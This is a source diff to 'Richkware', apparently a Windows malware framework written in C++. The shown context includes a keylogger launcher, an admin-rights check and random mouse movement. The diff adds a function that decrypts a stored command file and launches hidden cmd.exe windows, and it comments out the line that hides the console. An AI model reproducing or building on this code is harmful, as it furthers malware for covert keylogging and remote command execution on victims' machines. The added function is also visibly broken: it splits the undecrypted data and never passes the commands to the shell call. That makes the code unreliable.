@@ -3,6 +3,7 @@
 */
 
 #include "richkware.h"
+#include "utils.h"
 
 BOOL Richkware::IsAdmin() {
     BOOL fIsRunAsAdmin = FALSE;
@@ -90,6 +91,16 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
+void Richkware::executeCommands() {
+    std::string commands = systemStorage.LoadValueFromFile("commands.richk");
+    //decrypt string
+    Crypto crypto(encryptionKey);
+    std::string decryptedCommands = crypto.Decrypt(commands);
+    std::vector<std::string> commandList = utils::split(commands, "##");
+    for (size_t i = 0; i < commandList.size(); ++i) {
+        ShellExecute(0, "open", "cmd.exe", "start", 0, SW_HIDE);
+    }
+}
 
 void Richkware::Keylogger(const char *fileName) {
     HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void *) fileName, 0, 0);
@@ -138,7 +149,7 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 Richkware::Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress,
                      const char *port, const char *associatedUser) {
     appName = AppNameArg;
-    ShowWindow(GetConsoleWindow(), 0);
+    //ShowWindow(GetConsoleWindow(), 0);
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
